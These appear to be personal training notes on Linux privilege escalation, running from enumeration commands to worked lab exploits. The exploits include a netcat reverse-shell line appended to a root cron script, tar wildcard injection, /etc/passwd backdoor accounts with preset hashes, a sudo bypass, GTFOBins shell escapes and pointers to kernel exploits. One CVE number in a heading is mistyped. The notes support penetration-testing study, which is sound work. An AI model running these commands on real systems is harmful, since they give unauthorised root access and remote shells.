---
tags:
- training material
created: 2020-01-01
lastmod: 2020-01-01
published: 2020-01-01
image: 
description: 
---
## Enumeration

>[!info]- Files and Users Privileges
>Read, write and execute permissions:
>
>| Permission | File                        | Directory                       |
>| ---------- | --------------------------- | ------------------------------- |
>| r          | Can read the file           | Can read the content            |
>| w          | Can change the file content | Can create/delete content       |
>| x          | Can run the file            | Can cross through its content\* |
>
>\*Being able to cross through a directory (_w_) but not being able to read its content (_r_) gives the user permission to access known entries, but only by knowing their exact name.
>
>---
>Owner, group owner and other group permissions:
>
>![Pasted image 20240509052850](Pasted%20image%2020240509052850.png)
>`-rw-r-----`
>`[file type][root permissions][shadow group permissions][other group]`

>[!code]- Users
>The `id` command shows current user information.
>
>---
>The `/etc/password` file contains all users:
>
>![Pasted image 20240509053556](Pasted%20image%2020240509053556.png)
>Information relating to 'joe':
>- **Login Name**: "joe"
>- **Encrypted Password**: "x" _Means the password hash is within the `/etc/shadow` file_
>- **UID**: "1000" _User ID (aka real user ID). Linux starts counting regular user IDs from 1000_
>- **GID**: "1000" _Group ID value_
>- **Comment**: "joe,,," _General contains a description of the user, often simply username information_
>- **Home Folder**: "/home/joe"
>- **Login Shell**: "/bin/bash" _The default interactive shell, if one exists_
>
>System services are configured with the **/usr/sbin/nologin** home folder.

>[!code]- System information
>- `hostname` shows the hostname
>---
>Operating system release and version:
>- `/etc/issue`
>- `/proc/version`
>- `/etc/os-release`
>- `uname -a`
>- `dpkg --print-architecture`

>[!code]- Running process & services
>`ps auxww` lists system processes - are any that are running as root vulnerable?
>
>---
>We can see which processes are running each command:
>```bash
>joe@debian-privesc:~$ watch -n 1 "ps -auxww"
>```
>___
>
>Pspy (check running commands - any cron jobs running?)
>```bash
>./pspy64
>```

>[!code]- Network interfaces, route, and open ports
>`ip a` or `ifconfig a` shows network adapter information.
>
>---
>
>`route` or `routel` shows the network routing table.
>
>---
>`netstat` or `ss` shows active network connections and listening ports.
>	`-a` list all connections
>	`-n` avoid hostname resolutions
>	`-p` list the process name the connection belongs to
>`netstat -tulpn`
>###### [JDWP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol) (port 8000)

>[!code]- Firewalls
>We **must** have _root_ privileges to list firewall rules with _iptables_.
>```powershell
>cat /etc/iptables/rules.v4
>sudo iptables -L
>```

>[!code]- Scheduled tasks (cron)
>###### List
>```bash
>cat /etc/crontab
>ls -lah /etc/cron*/
>grep "CRON" /var/log/syslog  # running jobs
>```
>###### Wildcard exploit - [guide](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
>```powershell
>cd /opt/admin
>echo "reverse shell command" > shell.sh
>echo '' > --checkpoint=1
>echo '' > "--checkpoint-action=exec=sh shell.sh"
>```

>[!code]- Installed packages
>`dpkg -l` to list installed applications by dpkg on a Debian system.

>[!code]- Insecure file permissions
>Search for every directory writable by the current user:
>```bash
>joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
>```

>[!code]- Configuration files
>Can list credentials:
>```bash
>find / -type f -iname '\*.conf' 2>/dev/null
>find / -type f -iname '\*.conf*' 2>/dev/null
>```

>[!code]- Mounted file systems
>Unmounted drives could contain valuable information. If unmounted drives exists, we should check the mount permissions.
>
>The `/etc/fstab` file lists all drives that will be mounted at boot time.
>
>_The system admin might have used custom configs or scripts to mount drives that aren't listed in **/etc/fstab/**. Its therefore good practice to also use **mount**._
>
>---
>
>`mount` lists all mounted file systems.
>
>---
>
>`lsblk` to view all available disks (are there partitions that aren't mounted?).

>[!code]- Drivers and kernel modules
>`lsmod` lists loaded kernel modules.
>`/sbin/modinfo <kernel module>` gives further information about that module.

>[!code]- Kernel Exploits
>###### PwnKit (if policykit < version 0.120)
>Check version:
>```
>apt-cache policy policykit-1
>pkexec --version
>``` 
>Obtain an exploit:
>- Shell one-liner: https://github.com/ly4k/PwnKit
>- Python script: https://github.com/joeammond/CVE-2021-4034
>###### Kernel < 4.4.0-116 (Ubuntu 16.04.4) [Guide](https://www.exploit-db.com/exploits/44298)
>###### 5.8 < Kernel (uname) < 5.26 [Dirty Pipe](https://github.com/V0WKeep3r/CVE-2022-0847-DirtyPipe-Exploit)
>###### 4.15.x <= Kernel < 4.19.2 [CVE-2028-18955](https://github.com/scheatkode/CVE-2018-18955)

>[!code]- SetUID and SetGID
>###### SUID
>```powershell
>find / -perm -u=s -type f 2>/dev/null
>```

>[!code]- Capabilities
>Run **getcap** with the **-r** parameter to perform a recursive search starting from the root folder /, filtering out any errors from the terminal output:
>```bash
>joe@debian-privesc:~$ getcap -r / 2>/dev/null
>```

>[!code]- Automated enumeration
>`/usr/bin/unix-privesc-check [ standard | detailed ]` is a pre-installed bash script which performs a number of checks to find system misconfigurations that can be abused for local privilege escalation.
>
>---
>_LinEnum_ and _LinPeas_ are automated enumeration tools which are tailored to providing privilege escalation information.

>[!code]- Credential harvesting
>Credentials may be stored in an environment variable. List environment variables with the `env` command.
>
>If a variable also appears in the **.bashrc** file as `export VARIABLE=value`, it means its a permanent variable (which gets loaded when a user's shell is launched).
>
>---
>Find running process that use cleartext passwords:
>```bash
>joe@debian-privesc:~$ watch -n 1 "ps -aux" | grep "pass"
>```
>
>---
>
>Find network traffic containing cleartext password:
>```bash
>joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
>```

>[!code]- Sudo permissions
>`sudo -l` lists the commands the current user can run with elevated privileges.
>`sudio -i` runs an interactive shell as root (if permitted).

>[!code]- Sudo exploit (< 1.8.28)
>###### Command to obtain root shell
>```powershell
>sudo -u#-1 /bin/bash
>```

>[!code]- Writeable files
>###### /etc/passwd
>```powershell
>pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
>
># Offsec method
>openssl passwd -1 -salt GitRekt pwn1337
>echo 'GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash' >> /etc/passwd
>```
>###### General
>```powershell
>find /etc -type f -writable 2> /dev/null
>```

>[!code]- Network traffic
>`tcpdump` is the defacto command line standard for packet capture, but it requires admin privileges.
>
>Sometimes, however, certain accounts are given exclusive access to `tcpdump` for troubleshooting purposes. This would be apparent via listing the sudo permissions with `sudo -l`.
>
>---
>Capture traffic in and out of the loopback address:
>```bash
>joe@debian-privesc:~$ sudo tcpdump -i lo -A
>```

>[!code]- Mail
>###### Enumerate mail for sensitive information
>```powershell
>/var/mail
>/var/spool/mail
>```
## Exploits
#### Cron jobs

>[!exploit]- Exploit - Misconfigured cron jobs running as root could afford privilege escalation 
>If a cron job is ran in the context of a root user, and it executes a file with insecure permissions, we could alter that file to have custom code execution by the root user.

>[!code]- Find a vulnerable cron job
>See the section on enumerating [](.md#^d1325a|scheduled%20tasks). Look for a job that is running a file that can be altered and is running as an elevated user.

>[!success] We find the _user_backups.sh_ file is writable and located in the current user's home directory and is scheduled to be run as _root_ every minute.

>[!code]- Edit the file to run malicious code (reverse shell)
>The vulnerable file:
>```bash
>joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
>```
>Add malicious code (reverse shell) to the end:
>```bash
>joe@debian-privesc:~$ cd .scripts
>joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
>joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
>```

>[!code]- Setup a listener and wait for cron job to run
>```bash
>kali@kali:~$ nc -lnvp 1234
>```
#### Insecure /etc/passwd permissions

>[!info]- Info - /etc/shadow vs /etc/passwd
>Linux passwords are usually stored in **/etc/shadow** (ie, unless an Active Directory or LDAP is used).
>
>For backwards compatibility, however, passwords hashes can be present in the **/etc/passwd** file. If so, the hash takes precedence over the respective entry in **/etc/shadow**.

>[!exploit]- Exploit - Write access for **/etc/passwd** means we can set an arbitrary password for any account.

>[!code]- Create and login as a new user with root privileges
>Generate a suitable hash:
>```bash
>joe@debian-privesc:~$ openssl passwd w00t
>```
>_The output of the OpenSSL passwd command varies depending on the system executing it. On older system is may default to the DES algorithm, while on newer systems it could output in MD5 format._
>
>---
>
>Add the new user to _/etc/passwd_:
>```bash
>joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
>```
>_The UID and GID values are 0, specifying that the account is a superuser_.
>
>---
>
>Switch to the new user:
>```bash
>joe@debian-privesc:~$ su root2
>Password: w00t
>```
#### SUID binaries

>[!info]- Info - What is a SUID flag?
>The SUID flag allows a process or script to run as the owner, rather than the user initiating it. The SUID flag is denoted with an _s_ flag in the file permissions.

>[!exploit]- Exploit - SUID enabled files could allow us to execute code as a privileged user
>If we find a file that is misconfigured and has the SUID flag, we can exploit it to run a command with elevated privileges.

>[!code]- Find a vulnerable SUID enabled file
>```bash
>joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
>```

>[!success] The _find_ program is vulnerable

>[!code]- Find an exploit for the vulnerable file
>[GTFO Bins can help](https://gtfobins.github.io/). The _-exec_ parameter can be exploited to run a bash shell along with the _-p_ parameter.
>```bash
>joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
>```
#### Capabilities

>[!info]- Info - What are capabilities?
>Capabilities are extra attributes that can be applied to processes, binaries and services to assign specific privileges normally reserved for administrative operations like traffic capturing or adding kernel modules.

>[!exploit]- Exploit - If a capability is misconfigured it could allow privilege escalation.

>[!code]- List capabilities
>```bash
>joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
>```

>[!success]- The _perl_ binaries stand out
>![Pasted image 20240511063627](Pasted%20image%2020240511063627.png)

>[!code]- Find an exploit
>The [GTFOBins website can help](https://gtfobins.github.io/).
>```bash
>joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
>```
#### Sudo

>[!info]- Info - What is the sudo command?
>The _sudo_ command can be used to execute a command with elevated privileges. To use it, a user must be a member of the sudo group (on Debian based Linux distros).

>[!code]- List the allowed sudo commands
>```bash
>joe@debian-privesc:~$ sudo -l
>```

>[!success] apt-get can be run as sudo

>[!code]- Find an exploit
>The [GTFOBins website](https://gtfobins.github.io/)can help with that.
>```bash
>joe@debian-privesc:~$ sudo apt-get changelog apt
>joe@debian-privesc:~$ !/bin/sh
>```

#### Kernel Vulnerabilities

>[!warning]- Limitation - This may require also matching the OS system flavour
>Success in exploiting a kernel vulnerability may depend on matching not only the target's kernel version, but also the operating system flavour (eg Debian, RHEL, Gentoo, etc).

>[!code]- Enumerate target machine information
>The **/etc/issue** file contains a message or system identification to be printed before the login prompt:
>```bash
>joe@ubuntu-privesc:~$ cat /etc/issue
>Ubuntu 16.04.4 LTS \n \l
>```
>
>---
>
>Inspect kernel version and system architecture:
>```bash
>joe@ubuntu-privesc:~$ uname -r
>4.4.0-116-generic
>
>joe@ubuntu-privesc:~$ arch
>x86_64
>```

>[!code]- Search for an exploit
>Searchsploit can help. We want to use “linux kernel Ubuntu 16 Local Privilege Escalation” as our main keywords. We also want to filter out some clutter from the output, so we’ll exclude anything below kernel version 4.4.0 and anything that matches kernel version 4.8:
>```bash
>kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
>```

>[!success] We choose a newer exploit _'linux/local/45010.c'_

>[!code]- Execute the exploit
>Inspect first 20 lines (to spot any compilation instructions):
>```bash
>kali@kali:~$ head 45010.c -n 20
>```
>
>____
>
>Copy it to target:
>```bash
>kali@kali:~$ scp 45010.c joe@192.168.123.216:
>```
>
>___
>
>Compile and then run it (using the compiler on the target machine to ensure it matches the architecture):
>```bash
>joe@ubuntu-privesc:~$ gcc 45010.c -o 45010
>joe@ubuntu-privesc:~$ ./45010
>
#### Miscellaneous

>[!code]- Generate SSH keys
>###### Non-interactive setup
>```powershell
># -t rsa  Specifies key type (can be rsa, ed25519, ecdsa, etc.)
># -b 4096  Specifies bit size for key
># -f ~/.ssh/id_rsa  Specifies the file path where private key will be saved
># -N ""  Sets an empty passphrase for private key
>
>ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
>```

